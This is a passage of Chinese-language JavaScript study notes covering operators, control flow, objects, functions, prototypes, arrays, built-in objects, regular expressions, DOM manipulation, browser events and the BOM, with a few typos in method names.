如果第一个值为true，则必然返回第二个值\n                - 如果第一个值为false，则直接返回第一个值\n\n            - 或运算\n                - 如果第一个值为true，则直接返回第一个值\n                - 如果第一个值为false，则返回第二个值\n\n    赋值运算符\n        =   +=  -=  *=  /=  %=\n\n    关系运算符\n        &gt;   &gt;=  &lt;   &lt;=\n\n        - 字符串比较 是比较字符的Unicode编码  \n\n    相等运算符\n        ==(相等 会自动做类型转换)  !=(不相等)     ===(全等 不会自动做类型转换)  !==(不全等)\n            - undefined 衍生自 null      \n\n    条件运算符/三元运算符\n        语法：\n            条件表达式?语句1:语句2;\n\n        执行的流程：\n            条件运算符再执行时，首先对条件表达式进行求值，\n            如果该值为true,则执行语句1，并返回结果\n            如果该值为false，则执行语句2，并返回结果\n\n运算符的优先级\n\n流程控制\n    语句的分类：\n        1. 条件判断语句\n        2. 条件分支语句\n        3. 循环语句\n\n    条件判断语句：\n        语法一：\n            if(条件表达式){\n                语句;\n            }\n\n        语法二：\n            if(条件表达式){\n                语句..;\n            }else{\n                语句..;\n            }\n\n        语法三：\n            if(条件表达式){\n                语句..;\n            }else if(条件表达式){\n                语句..;\n            }else if(条件表达式){\n                语句..;\n            }else{\n                语句..;\n            }\n\n    条件分支语句：\n        语法： \n            switch(条件表达式){\n                case 表达式:\n                    语句..;\n                case 表达式:\n                    语句..;\n                case 表达式:\n                    语句..;\n                default:\n                    语句..;\n                    break;\n            }\n\n    循环语句\n        while循环：\n            语法：  \n                while(条件表达式){\n                    语句..;\n                }\n\n        do...while循环：\n            语法：  \n                do{\n                    语句..;\n                }while(条件表达式);\n\n        for循环\n            语法:\n                for(初始化表达式;条件表达式;更新表达式){\n                    语句..;\n                }(重点内容)对象\n对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性\n\n对象的分类：\n    1. 内建对象\n        - 由ES标准中定义的对象，在任何的ES的实现中都可以使用\n        - 比如：Math String Number Boolean  Function Object ...\n\n    2. 宿主对象\n        - 由js的运行环境提供的对象，目前来讲主要指由浏览器提供的对象\n        - 比如 BOM DOM \n\n    3. 自定义对象\n        - 由开发人员自己创建的对象\n\n对象的基本操作\n    创建对象\n        使用new关键字调用的函数，是构造函数constructor\n        构造函数是专门用来创建对象的函数\n\n        语法： \n            var 变量名 = new Object();\n\n    添加对象属性\n        语法： \n            对象.属性名 = 属性值;\n\n    读取对象中的属性\n        语法： \n            对象.属性名;\n\n    修改对象的属性值\n        语法： \n            对象.属性名 = 新值;\n\n    删除对象的属性\n        语法：  \n            delete 对象.属性名;\n\n属性名 和 属性值\n\n    属性名\n\n    如果要使用特殊的属性名，不能采用.的方式来操作\n        需要使用另一种方式：\n            语法： \n                对象[&apos;属性名&apos;] = 属性值\n\n        特点：\n            使用[]这种形式去操作属性，更加灵活\n\n    属性值\n\n        js对象的属性值，可以是任意的数据类型\n            - 甚至可以是对象\n\n    in 运算符\n        - 通过该运算符可以检查一个对象中是否含有指定的属性\n            如果有则返回true，没有则返回false\n        - 语法：    \n            &quot;属性名&quot; in 对象\n\n基本数据类型与引用数据类型\n    基本数据类型\n        String Number Boolean Null Undefined\n\n    引用数据类型\n        Object\n\n    基本数据类型与引用数据类型区别\n\n        js中的变量(基本数据类型)都是保存到栈内存中的\n            基本数据类型的值直接在栈内存中存储\n            值与值之间是独立存在，修改一个变量不会影响到其他的变量\n\n        对象则是保存到堆内存中\n            每创建一个新的对象，就会在堆内存中开辟出一个新的空间，\n            而变量保存的是对象的内存地址（对象的引用）,如果两个变量\n            保存的是同一个对象引用，当通过一个变量修改属性时，另一个也会受到影响\n\n       当比较两个基本类型的时候，就是比较值。\n       而比较两个引用数据类型时，他们比较的对象是内存地址，\n        如果两个对象是一模一样，但是地址不同，它也会返回false \n对象字面量\n\n    使用对象字面量，可以在创建对象时，直接指定对象中的属性\n\n    语法：\n        {属性名:属性值,属性名:属性值...}\n            对象字面量的属性名可以加引号也可以不加,建议不加\n            如果要使用一些特殊的名字，则必须加引号\n\n\n函数\n    函数也是一个对象\n    函数的实参可以是任意类型的数据\n    函数返回值可以是任意的数据类型\n\n    创建函数\n\n        使用 函数声明 来创建一个函数\n        语法： \n            function 函数名([形参1,形参2...形参N]){\n                语句...;\n            }\n\n        使用 函数表达式 来创建一个函数 也叫匿名函数\n        语法： \n            var 函数名 = function([形参1,形参2...形参N]){\n                语句...;\n            }\n\n    调用函数\n        语法： \n            函数名();\n\n    函数的方法\n        call()和apply()\n        - 这两个方法都是函数对象的方法，需要通过函数对象来调用\n        - 当对函数调用call() 和 apply() 都会调用函数执行\n        - 在调用call() 和 apply() 可以将一个对象指定为第一个参数\n            此时这个对象将会成为函数执行时的this\n        - call() 方法可以将实参对象之后依次传递\n        - apply() 方法需要将实参在对象之后依次传递\n\n        - this的情况：\n            1. 以函数形式调用时，this永远都是window\n            2. 以方法的形式调用时，this是调用方法的对象\n            3. 以构造函数的形式调用时，this是新创建的那个对象\n            4. 使用call和apply调用时，this是指定的那个对象\n\n    函数的参数(arguments)\n        在调用函数时，浏览器每次都会传递进两个隐含的参数：\n            1. 函数的上下文对象 this\n            2. 封装实参的对象 arguments\n                - arguments 是一个类数组对象，它也可以通过索引来操作数据，也可以获取长度\n                - 在调用函数时，我们所传递的实参都会在arguments中保存\n                - arguments.length 可以用来获取实参的长度\n                - 即使不定义形参，也可以通过arguments来使用实参，只不过比较麻烦\n                    arguments[0] 表示第一个实参\n                    arguments[1] 表示第二个实参\n                    ...\n\n                - 属性 callee\n                    作用：指向当前正在指向的函数的对象\n\n    立即执行函数\n        函数定义完，立即被调用，这种函数叫做立即执行函数\n        立即函数往往只会执行一次\n        语法：\n            (function(a,b){\n                alert(a+b);\n            })(100,100);\n\n    函数也可以成为对象的属性\n        如果一个函数作为一个对象的属性保存，\n        那么我们称这个函数为对象的方法\n        调用这个函数就为调用对象的方法(method)\n\n        但是它只是名称上区别并没有其他区别\n\n    枚举对象中的属性\n        使用for ... in 语句\n        语法： \n            for(var 变量 in 对象){\n\n            }\n\n    变量的声明提前\n        - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值）\n            但是如果声明变量时不适用var关键字，则变量不会被声明提前\n\n    函数的声明提前\n        - 使用函数声明形式创建的函数 function 函数(){}\n            它会在所有代码执行之前就创建，所以我们可以在声明前调用\n\n    作用域\n        - 作用域指一个变量的作用的范围\n        - 在js中一共有两种作用域：\n            1. 全局作用域\n                - 直接编写在script标签中的js代码，都在全局作用域\n                - 全局作用域在页面打开时创建，在页面关闭时销毁\n                - 在全局作用域中有一个全局对象window，\n                    它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用\n                - 在全局作用域中：\n                    创建的变量都会作为window对象的属性保存\n                    创建的函数都会作为window对象的方法保存\n                - 全局作用域中的变量都是全局变量\n                    在页面的任意的部分都可以访问到\n\n            2. 函数作用域\n                - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁\n                - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的\n                - 在函数作用域中可以访问到全局作用域的变量\n                    在全局作用域中无法访问到函数作用域的变量\n                - 当在函数作用域操作一个变量时，它会现在自身作用域中寻找，如果有就直接使用\n                    如果没有则向上一级作用域中寻找，直到找到全局作用域，\n                    如果全局作用域中依然没有找到，则会报错ReferenceError\n                - 在函数中要访问全局变量可以使用window对象\n\n        解析器在调用函数每次都会向函数内部传递进一个隐含的参数，\n            这个隐含的参数就是this，this指向的是一个对象，\n            这个对象我们称为函数执行的 上下文对象，\n            根据函数的调用方式的不同，this会指向不同的对象\n                1. 以函数的形式调用时，this永远都是window\n                2. 以方法的形式调用时，this就是调用方法的那个对象\n\n\n    构造函数\n        构造函数其实就是普通函数，创建方式和普通方式没有区别，\n            不同的是构造函数习惯首字母大写\n\n        构造函数和普通函数的区别：\n            调用方式的不同\n                普通函数就是直接调用，而构造函数需要使用new关键字来调用\n\n        构造函数的执行流程\n            1. 立即创建一个新对象\n            2. 将新建的对象设置为函数中this，在构造函数中可以使用this来引用新建的对象\n            3. 逐行执行函数中的代码\n            4. 将新建的对象作为返回值返回\n\n        使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类。\n            我们将通过一个构造函数创建的对象，称为该类的实例\n\n        this的情况\n            1. 当以函数的形式调用时，this是windo\n            2. 当以方法的形式调用时，谁调用方法this就是谁\n            3. 当以构造函数的形式调用时，this就是新创建的那个对象\n\n        运算符 instanceof\n        作用：检查 一个对象 是否 是一个类的实例\n        语法：\n            对象 instamceof 对象\n\n    原型 prototype\n        原型是个对象，可以用来弥补 多次调用构造函数的方法 会产生多个不同内存但是相同的方法。\n        通过把共有的对象写入 到原型对象中，可以有效解决这个缺陷。\n\n        原型对象如何使用？\n        语法： \n            对象名.prototype.属性名= 属性值;\n            对象名.prototype.方法名 = function(){\n\n            };\n\n\n        我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype\n        这个属性对应着一个对象，这个对象就是我们所谓的原型对象\n\n        如果 函数作为普通函数调用prototype没有任何作用\n        当函数以构造函数的形式调用时，它所创建的对象中都会有一个隐含的属性，\n        指向该构造函数的原型对象，我们可以通过__proto__来访问该属性\n\n        原型对象就相当于一个公共的区域，所有同一个类的实例都可以访问到这个原型对象，\n        我们可以将对象中共有的内容，统一设置到原型对象中\n\n        当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果有直接使用，\n        如果没有则会去原型对象中寻找\n\n        以后我们创建构造函数时，可以将这些对象共有的属性和方法，统一添加到构造函数的原型对象中，\n        这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了\n\n        使用in检查对象中是否含有某个属性时，如果对象中没有但是原型中有 会返回true\n\n        但是如果我们要检查 对象自身中是否含有该属性 则需要用对象的hasOwnProperty()\n        方法来检查\n\n        原型对象也是对象，所有它也有原型\n            当我们使用一个对象的属性或方法时，会先在自身中寻找，\n            自身中如果有，则直接使用，\n            如果没有则去原型对象中寻找，如果原型对象中有，则使用，\n            如果没有则去原型的原型中寻找        \n            Object对象的原型没有原型，如果在Object原型中依然没有找到，则返回undefined\n\n        在页面中打印一个对象时，实际上是输出对象的toString()方法的返回值\n\n        垃圾回收（GC）\n            - 程序运行过程中会产生垃圾，垃圾堆积过多，会导致程序变慢或内存溢出奔溃，\n                所有在程序运行中需要一个垃圾回收机制来处理程序垃圾\n\n            - 什么是程序垃圾？\n                当一个对象没有任何的变量或属性对它进行引用，也永远无法操作该对象，\n                这个对象就是一个程序垃圾。\n\n            - 在js中拥有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁，\n                我们不需要也不能进行垃圾回收的操作\n\n            - 我们需要做的只是要将不再使用的对象设置为null即可\n\n数组(Arry)\n\n    - 数组也是一个对象\n    - 它和我们普通对象功能类似，用来存储数据\n    - 数组中的元素可以是任意的数据类型\n    - 不同之处：\n        对象使用字符串作为属性名\n        数组使用数字作为索引操作元素\n    - 索引\n        从0开始的整数就是索引\n    - 数组的存储性能比普通对象要好，在开发中我们经常使用数组来存储一些数据    \n\n\n    创建数组\n        var arr = new Array()\n            使用typeof 检查一个数组时，会返回object\n\n    向数组中添加元素\n    语法： \n        数组[索引] = 值\n        arr[0] = 100\n\n    读取数组中的元素\n    语法：  \n        数组[索引]\n        arr[0]\n            读取不存在的索引，不会报错，会返回undefined\n\n    获取数组的长度\n    - 可以使用length属性来获取数组的长度（元素的个数）\n\n    语法： \n        数组.length\n        arr.length  \n            对于连续的数组，使用length可以获取到数组的长度(元素的个数)\n            对于非连续的数组，使用length会获取到数组的最大的索引+1\n            尽量不创建非连续数组\n\n    向数组的最后一位添加元素\n    语法： \n        数组[arr.length] = 100\n        arr[arr.length] = 100\n\n    使用字面量来创建数组\n    语法： \n        var arr = []\n            使用字面量创建数组时，可以在创建时就指定数组中的元素\n                var arr = [1,2,3,4,5]\n\n\n    操作数组的方法\n        push()\n            - 该方法可以向数组的末尾添加一个或多个元素，并返回数组的新的长度\n            - 可以将要添加的元素 作为参数传递，这样这些元素会自动添加到数组末尾\n            - 该方法会将数组新的长度作为返回值返回\n\n        pop()\n            - 该方法可以删除数组的最后一个元素，并将被删除的元素作为返回值返回\n\n        unshift()\n            - 向数组开头添加一个或多个元素，并返回新的数组长度\n            - 向前边插入元素以后，其他的元素索引会依次调整\n\n        shift()\n            - 可以删除数组的第一个元素，并将被删除的元素作为返回值返回\n\n        slice()\n            - 可以用来从数组提取指定元素\n            - 该方法不会改变元素数组，而是将截取到的元素封装到一个新数组中返回\n            - 参数：\n                1. 截取开始的位置的索引，包含开始索引\n                2. 截取结束的位置的索引，不包含结束索引\n                    - 第二个参数可以省略不写，此时会截取从开始索引往后的所有元素\n                - 索引可以传递一个负值，如果传递一个负值，则从后往前计算\n                    -1 代表倒数第一个\n                    -2 代表倒数第二个\n\n        splice()\n            - 可以用于删除数组中的指定元素\n            - 使用splice()会影响到原数组，会将指定元素从原数组中删除\n                并将被删除的元素作为返回值返回\n\n            - 参数：\n                第一个，表示开始位置的索引\n                第二个，表示删除的数量\n                第三个及以后\n                    可以传递一些新的元素，这些元素将会自动插入到开始位置索引前边\n\n        concat()\n            - 可以连接两个或多个数组，并将新的数组返回\n            - 该方法不会对原数组产生影响\n\n        join()\n            - 该方法可以将数组转换为一个字符串\n            - 该方法不会对原数组产生影响，而是将转换后的字符串作为结果返回\n            - 再join() 中可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符\n                如果不指定连接符，则默认,作为连接符\n\n        reverse()\n            - 该方法用来反转数组（前面的去后边，后边的去前边）\n            - 该方法会直接修改原数组\n\n        sort()\n            - 可以用来对数组中的元素进行排序\n            - 也会影响原数组，默认会按照Unicode编码进行排序\n\n\n    forEach() 遍历数组\n        - 这个方法只支持IE8以上的浏览器\n            IE8及以下的浏览器均不支持该方法，所有如果需要兼容IE8，则不要使用forEach\n        - 方法需要一个函数作为参数\n        - 像这种函数，由我们创建但是不由我们调用，我们称回调函数\n        - 数组中有几个元素函数就会执行几次，每次执行时，浏览器会将遍历到的元素\n            以实参的形式传递进来，我们可以定义形参，来读取这些内容\n        - 浏览器会在回调函数中传递三个参数：\n            第一个参数，就是当前正在遍历的元素\n            第二个参数，就是当前正在遍历的元素的索引\n            第三个参数，就是正在遍历的数组（整个数组对象）\n\nDate对象\n    - 在JS中使用Date对象来表示一个时间\n\n    创建一个Date对象\n        var d = new Date();\n\n    创建一个指定的时间对象\n        日期的格式  月份/日/年 时:分:秒\n        var d2 = new Date(&quot;2/18/2011 11:10:30&quot;);\n\n    日期获取的几个方法\n\n        getDate()\n            - 获取当前日期对象是几日\n\n        getDay()\n            -  获取当前日期对象时周几\n            - 会返回一个0-6的值\n                0 表示周日\n\n        getMonth()\n            - 获取当前时间对象的月份\n            - 会返回一个0-11的值\n                0 表示1月\n\n        getFullYear()\n            - 获取当前日期对象的年份\n\n        getTime()\n            - 获取当前日期对象的时间戳\n            - 时间戳，指的是从格林威治标准时间的1970年1月1日，0时0分0秒\n                到当前日期所花费的毫秒数（1秒 = 1000毫秒）\n            - 计算机底层在保存时间时使用都是时间戳\n\nMath对象\n    - Math和其他的对象不同，它不是一个构造函数，\n        它属于一个工具类不用创建对象，它里边封装了数学运算相关的属性和方法\n    - 比如\n        Math.PI 表示的圆周率\n\n    方法：   \n        abs()\n            - 可以用来计算一个数的绝对值\n\n        Math.ceil()\n            - 可以对一个数进行向上取整，小数位只有有值就自动进1\n\n        Math.floor()\n            - 可以对一个数进行向下取整，小数部分会被舍掉\n\n        Math.round()\n            - 可以对一个数进行四舍五入取整\n\n        Math.random()\n            - 可以用来生成一个0-1之间的随机数\n            - 生成一个0-10的随机数\n            - 生成一个0-x之间的随机数\n            Math.round(Math.random()*x)\n\n            - 生成一个1-10\n            - 生成一个x-y之间的随机数\n                Math.round(Math.random()*(y-x)+x)\n\n        Math.max() 可以获取多个数中的最大值 \n        Math.min() 可以获取多个数中的最小值\n        Math.pow(x,y) 返回x的y次幂\n        Math.sqrt() 用于对一个数进行开方运算\n\n包装类\n\n    在JS中为我们提供了三个包装类，通过这三个包装类可以将基本数据类型的数据转换为对象\n    方法：\n        String()\n        - 可以将基本数据类型字符串转换为String对象\n        Number()\n        - 可以将基本数据类型的数字转换为Number对象\n        Boolean()\n        - 可以将基本数据类型的布尔值转换为Boolean对象\n        但是注意：我们在实际应用中不会使用基本数据类型的对象，\n        如果使用基本数据类型的对象，在做一些比较时可能会带来一些不可预期的结果\n\n    注意事项：\n        方法和属性只能添加给对象，不能添加给基本数据类型\n        当我们对一些基本数据类型的值去调用属性和方法时，\n        浏览器会临时使用包装类将其转换为对象，然后在调用对象的属性和方法\n        调用完以后，在将其转换为基本数据类型    \n\n操作字符串的相关方法\n\n    属性：\n        length\n            - 可以用来获取字符串的长度\n\n    方法：\n        charAt()\n            - 可以返回字符串中指定位置的字符\n            - 根据索引获取指定的字符     \n\n        charCodeAt()\n            - 获取指定位置字符的字符编码（Unicode编码）\n\n        formCharCode()\n            - 可以根据字符编码去获取字符\n\n        concat()\n            - 可以用来连接两个或多个字符串\n            - 作用和+一样 \n\n        indexof()\n            - 该方法可以检索一个字符串中是否含有指定内容\n            - 如果字符串中含有该内容，则会返回其第一次出现的索引\n                如果没有找到指定的内容，则返回-1\n            - 可以指定一个第二个参数，指定开始查找的位置 \n\n        lastIndexOf();\n            - 该方法的用法和indexOf()一样，\n                不同的是indexOf是从前往后找，\n                而lastIndexOf是从后往前找\n            - 也可以指定开始查找的位置     \n\n        slice()\n            - 可以从字符串中截取指定的内容\n            - 不会影响原字符串，而是将截取到内容返回\n            - 参数：\n                第一个，开始位置的索引（包括开始位置）\n                第二个，结束位置的索引（不包括结束位置）\n                    - 如果省略第二个参数，则会截取到后边所有的\n                    - 也可以传递一个负数作为参数，负数的话将会从后边计算\n\n        substring()\n            - 可以用来截取一个字符串，可以slice()类似\n            - 参数：\n                - 第一个：开始截取位置的索引（包括开始位置）\n                - 第二个：结束位置的索引（不包括结束位置）\n                - 不同的是这个方法不能接受负值作为参数，\n                    如果传递了一个负值，则默认使用0\n                - 而且他还自动调整参数的位置，如果第二个参数小于第一个，则自动交换\n\n        substr()\n            - 用来截取字符串\n            - 参数：\n                1.截取开始位置的索引\n                2.截取的长度\n\n        split()\n            - 可以将一个字符串拆分为一个数组\n            - 参数：\n                -需要一个字符串作为参数，将会根据该字符串去拆分数组\n\n        toUpperCase()\n            - 将一个字符串转换为大写并返回\n\n        toLowerCase()\n            -将一个字符串转换为小写并返回\n\n正则表达式\n    - 正则表达式用于定义一些字符串的规则，\n        计算机可以根据正则表达式，来检查一个字符串是否符合规则\n        获取将字符串中符合规则的内容提取出来\n\n    创建正则表达式的对象\n        使用构造函数创建正则对象\n        语法： \n            var 变量 = new RegExp(&apos;正则表达式&apos;, &apos;匹配模式&apos;);\n            使用typeof检查正则对象，会返回object\n\n        使用字面量创建正则对象\n            var patt = /正则表达式/匹配模式\n\n    修饰符/匹配模式\n        i   执行对大小写不敏感的匹配\n        g   执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）\n        m   执行多行匹配\n\n    方括号\n        [abc]   查找方括号之间的任何字符\n        [^abc]  查找任何不在方括号之间的字符\n        [0-9]   查找任何从 0 到 9 的数字\n        [a-z]   查找任何从小写 a 到 小写 z 的字符\n        [A-Z]   查找任何从大写 A 到 大写 Z的字符\n        (reg|blue|green)    查找任何指定的选项\n\n    元字符\n        .   查找单个字符，除了换行和行结束符\n        \\w  查找单词字符\n        \\W  查找非单词字符\n        \\d  查找数字\n        \\D  查找非数字字符\n        \\s  查找空白字符\n        \\S  查找非空白字符\n    ...\n\n    量词\n        n+  匹配任何包含至少一个 n 的字符串\n        n*  匹配任何包含零个或多个 n 的 字符串\n        n?  匹配任何包含零个或一个 n的 字符串\n        ...   \n\n    RegExp对象属性\n        global RegExp 对象是否具有标志g\n        ignoreCase RegExp 对象是否具有标志i\n        lastIndex 一个整数，标示开始下一次匹配的字符位置\n        multiline RegExp 对象是否具有标志 m\n\n    正则表达式的方法\n        compile()\n            - 编译正则表达式\n\n        exec() \n            - 匹配字符串中指定的值，返回找到的值，并确定其位置\n\n        test()\n            - 使用这个方法可以用来检查一个字符串是否符合正则表达式的规则，\n                如果符合则返回true，否则返回false\n\n    支持正则表达式的String对象的方法\n        search()\n            - 匹配与正则表达式想匹配的值\n\n        match()\n            - 找到一个或多个正则表达式的匹配\n\n        replace()\n            - 替换与正则表达式匹配的字串\n\n        split()\n            - 把字符串分割为字符串数组(重点内容)DOM (全称 Document Object Model 文档对象模型)    核心思想：找对象，搞对象\n- 文档\n    文档表示的就是整个的HTML网页文档\n- 对象\n    对象表示将网页中的每个部分都转换为了一个对象\n- 模型\n    使用模型来表示对象之间的关系，这样方便我们获取对象\n\n节点(Node)\n    - 构成HTML文档最基本的单元\n    常用节点分为四类\n    - 文档节点\n        整个HTML文档\n    - 元素节点\n        HTML文档中的HTML标签\n    - 属性节点\n        元素的属性\n    - 文本节点\n        HTML标签中的文本内容\n\n获取元素节点\n    - 通过document对象调用\n\n    getElementById()\n        - 通过id属性获取一个元素节点对象\n\n    getElementsByTagName()\n        - 通过标签名获取一组元素节点对象\n\n    getElementsByName()\n        - 通过name属性获取一组元素节点对象\n\n\n    获取元素节点的子节点\n        - 通过具体的元素节点调用\n\n        getElementsByTagName\n            - 方法，返回当前节点的指定标签名后代节点\n\n        childNodes\n            - 属性，表示当前节点的所有子节点\n\n        children\n            - 属性， 表示当前节点的所有有元素节点\n\n        firstChild\n            - 属性，表示当前节点的第一个子节点\n\n        lastChild\n            - 属性，表示当前节点的最后一个子节点\n\n    获取父节点和兄弟节点\n        - 通过具体的节点调用\n\n        parentNode\n            - 属性，表示当前节点的父节点\n\n        previousSibling\n            - 属性，表示当前节点的前一个兄弟节点\n\n        nextSibling\n            - 属性，表示当前节点的后一个兄弟节点\n\n    元素节点的属性\n        - 获取元素节点的值    \n            元素对象.属性名\n\n            element.value \n            element.id \n            element.className\n\n        - 设置元素节点的值\n            元素对象.属性名 = 新的值\n\n            element.value = &apos;值&apos;\n            element.id = &apos;值&apos;\n            element.className = &apos;值&apos;\n\n        其他属性\n            nodeValue\n                - 文本节点可以通过nodeValue属性获取和设置文本节点的内容\n\n            innerHTML\n                - 元素节点通过该属性获取和设置标签内部的html代码\n\n    DOM查询的其余方法\n        document.body\n            保存的是body的引用\n\n        document.documentElement\n            保存的是html根标签\n\n        document.all\n            代表页面中所有的元素\n\n        getElementByClassName()\n            根据元素的class属性值查询一组元素节点对象\n            但是该方法不支持IE8及以下的浏览器\n\n        getElementsByTagName()\n            可以指定标签名来获取页面中所有的指定标签\n\n        querySelector()\n            - 需要一个选择器的字符串做为参数，可以根据一个css选择器来查询一个元素节点对象\n            - 支持IE8及以上\n            - 只返回唯一的一个元素，如果满足条件的元素有多个，也只会返回一个\n\n        querySelectorAll()\n            - 该方法和querySelector()类似，不同的是它会将符合条件的元素封装到一个数组中返回\n            - 即使符合条件的元素只有一个，它也会返回数组\n\nDOM增删改方法\n    document.createElement()\n        - 可以用于创建一个元素节点对象\n        - 它需要一个标签名作为参数，将会根据该标签名创建元素节点对象\n            并将创建好的对象作为返回值返回\n\n    document.createTextNode()\n        - 用来创建一个文本节点对象\n        - 需要一个文本内容作为参数，将会根据该内容创建文本节点，并将新的节点返回\n\n    appendChild()\n        - 向一个父节点中添加一个新的子节点\n        - 用法：\n            父节点.appendChild(子节点);\n\n    insertBefore()\n        - 可以在指定的子节点前插入新的子节点\n        - 语法： \n            父节点.insertBefore(新节点, 旧节点);\n\n    replaceChild()\n        - 可以使用指定的子节点替换已有的子节点\n        - 语法： \n            父节点.replaceChild(新节点, 旧节点);\n\n    removeChild()\n        - 可以删除一个子节点\n        - 语法： \n            父节点.removeChild(子节点);\n            或\n            子节点.parentNode.removeChild(子节点);\n\nJS修改元素的样式\n    语法： \n        元素.style.样式名 = 样式值\n\n    注意事项： \n        如果CSS的样式名中含有-这种名称在JS中是不合法的，\n        比如background-color,要想使用，需要将这种样式名改\n        为驼峰命名法，去掉-，然后将-后的字母大写\n\n    说明：\n        通过style属性设置的样式都是内联样式，而内联样式有较高的\n        优先级，通过JS修改的样式往往会立即显示\n\n        但是如果在样式中写了!important, 则此时样式会有最高的优先级\n        即使通过js也不能覆盖该样式，此时将会导致JS修改样式失效\n        所以尽量不会为样式添加！important\n\nJS读取元素的样式\n    语法： \n        元素.style.样式名\n\n    说明：\n        通过style属性设置和读取的都是内联样式，无法读取样式表中的样式\n\nJS读取元素当前显示的样式\n    - 通过currentStyle 和 getComputedStyle() 读取到的样式都只是只读的，\n        不能修改，如果要修改必须通过style属性\n\n    currentStyle\n        语法： \n            元素.currentStyle.样式名\n\n        说明： \n            它可以用来读取当前正在显示的样式，如果该元素没有设置该样式，\n            则获取它的默认值\n\n        注意事项： \n            currentStyle只有IE浏览器支持，其他浏览器都不支持\n\n    getComputedStyle()\n        说明：\n            这个方法来获取元素当前的样式，这个方法是window的方法，可以直接使用\n            该方法会返回一个对象，对象中封装了当前元素对应的样式，\n            可通过对象.样式名来读取样式\n            如果获取的样式没有设置，则会获取到真实的值，而不是默认值\n            比如: 没有设置width，它不会获取到auto，而是一个长度\n\n        语法： \n            getComputedStyle(box1, null)\n                参数： \n                    第一个：\n                        要获取样式的元素\n                    第二个：\n                        可以传递一个伪元素，一般都传null\n\n        注意事项：\n            该方法不支持IE8及以下的浏览器\n\n\n事件(Event)\n\n    常用事件\n\n        onclick\n            - 单击事件\n\n        onmousemove\n            - 该事件将会在鼠标在元素中移动时被触发\n\n        onmousedown\n            - 该事件将会在鼠标被按下时被触发\n\n        onmouseup\n            - 该事件将会在鼠标被松开时触发\n\n\n    鼠标/键盘属性\n        clientX和clientY\n            - 用于获取鼠标在当前的可见窗口的坐标\n\n        pageX和pageY\n            - 用于获取鼠标相对于当前页面的坐标\n\n            但是这两个属性在IE8中不支持\n\n    事件的冒泡(Bubble)\n        - 所谓的冒泡指的就是事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会触发\n        - 在开发中大部分情况冒泡都是有用的，如果不希望发生事件冒泡可以通过事件对象来取消冒泡\n\n        取消冒泡\n            可以将事件对象的cancelBubble设置为true, 即可取消冒泡\n            语法： \n                event.cancelBubble = true;\n\n    事件的委派\n        - 指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素\n            从而通过祖先元素的响应函数来处理事件。\n\n        - 事件委派是利用了冒泡，通过委派可以减少事件绑定的次数，提高程序的性能\n\n        关键点\n            target\n                - event中的target表示的触发事件的对象\n\n\n    事件的绑定\n        addEventListener()\n            - 特点： 可以绑定多个单击响应函数\n            - 这个方法不支持IE8以以下浏览器\n            - 通过这个方法可以为元素绑定响应函数\n            - 参数：\n                1. 事件的字符串，不要on\n                    onclick不要on 只要click\n                2. 回调函数，当事件触发时该函数会被调用\n                3. 是否在捕获阶段触发事件，需要一个布尔值，一般都传false\n\n        attachEvent()\n            - 在IE8中可以使用\n            - 绑定多个单击响应函数\n            - 参数：\n                1. 事件的字符串, 要on \n                2. 回调函数\n            - 这个方法也可以同时为一个事件绑定多个处理函数\n                不同的是它是后绑定先执行，执行顺序和addEventListener() 相反\n\n    事件的传播(了解)\n\n    取消浏览器的默认行为：\n        第一种方法： \n            return false\n\n        第二种方法： \n            event.preventDefault() \n            注意： \n                IE8 不支持\n\n\n\n    鼠标事件\n    拖拽\n\n        注意事项：\n            当我么拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容，\n            这个行为会导致拖拽功能的异常，这个是浏览器提供的默认行为，\n            如果不希望发生这个行为，则可以通过 return false 来取消默认行为\n\n            但是 不对IE8起作用\n\n        IE8解决方法：\n            使用setCapture() 方法 将所有的拖拽事件 捕获到 自己身上\n            setCaptrue()\n                - 只有IE支持，但是火狐中调用时不会报错，\n                    而如果使用chrom调用，会报错\n\n            releaseCapture()\n                -  取消对事件的捕获\n\n    滚轮事件\n        onmousewheel \n            - 鼠标滚轮的事件 ，会在滚轮滚动时触发\n            - 但是火狐不支持该属性\n\n        DOMMouseScroll\n            - 鼠标滚轮的事件\n            - 可以支持火狐\n            - 但是该事件需要通过addEventListener() 函数来绑定\n\n        事件对象\n            event.wheelDelta \n                - 可以获取鼠标滚轮滚动的方向\n                -  向上滚 120 向下滚 -120\n                - 这个属性在火狐中不支持\n\n            event.detail\n                - 可以获取鼠标滚轮滚动的方向\n                - 支持火狐\n                - 向上滚 -3 向下滚 3\n\n    键盘事件\n        onkeydown\n            - 按键被按下\n            - 对于onkeydown来说如果一直按着某个按键不松手，则事件会一直触发\n                当onkeydown连续触发时，第一次和第二次之间会间隔稍微长一点，其他都会非常快\n                这种设计是为了防止误操作发生\n\n        onkeyup\n            - 按键被松开\n\n        键盘事件一般都会绑定给一些可以获取到焦点的对象或者是document \n\n        事件对象\n            event.keyCode\n                - 获取按键的编码\n\n            altKey\n            ctrlKey\n            shiftKey\n                - 这三个用来判断 alt ctrl 和 shift  是否被按下\n                    如果按下则返回true，否则返回false       (重点内容)BOM(浏览器对象模型)    - BOM可以使我么通过js来操作浏览器    - 在BOM中为我们提供了一组对象，用来完成对浏览器的操作    - BOM对象        Window            - 代表的是整个浏览器的窗口，同时window也是网页中的全局对象        Navigator            - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器        Location            - 代表当前浏览器的地址栏信息，通过Location可以获取地址栏信息，或者操作浏览器跳转页面        History            - 代表浏览器的历史记录，可以通过该对象来操作浏览器的历史记录                由于隐私原因，该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页                而且该操作只在当成访问时有效        Screen            - 代表用户的屏幕的信息，通过该对象可以获取到用户的显示器的相关的信息\n    - 